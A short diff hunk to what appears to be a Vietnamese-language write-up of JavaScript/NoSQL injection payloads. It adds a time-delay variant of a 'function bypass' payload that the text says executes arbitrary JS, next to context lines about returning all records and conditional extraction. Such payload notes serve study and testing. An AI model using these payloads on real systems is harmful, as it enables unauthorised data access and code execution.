@@ -128,6 +128,7 @@ Kết quả: TRUE → Trả về TẤT CẢ
 
 Payload 2: Function bypass
 Input: ' || (function(){ return true; })() || '
+Input: ' || (function(){ sleep(5000); return true; })() || '
 Kết quả: Thực thi function JS tùy ý
 
 Payload 3: Conditional extraction
